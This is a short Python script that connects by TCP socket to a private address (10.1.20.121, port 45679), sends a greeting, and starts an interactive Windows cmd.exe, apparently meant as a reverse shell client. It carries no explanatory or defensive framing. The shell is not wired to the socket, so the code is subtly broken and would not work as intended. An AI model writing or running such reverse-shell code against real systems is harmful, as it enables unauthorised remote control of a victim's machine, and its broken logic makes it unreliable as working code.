import socket
import subprocess
import os

socket_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

socket_handler.connect(("10.1.20.121", 45679))
socket_handler.send(b'Connected to server')

shell_remote = subprocess.call(["C:\Windows\System32\cmd.exe", "-i"])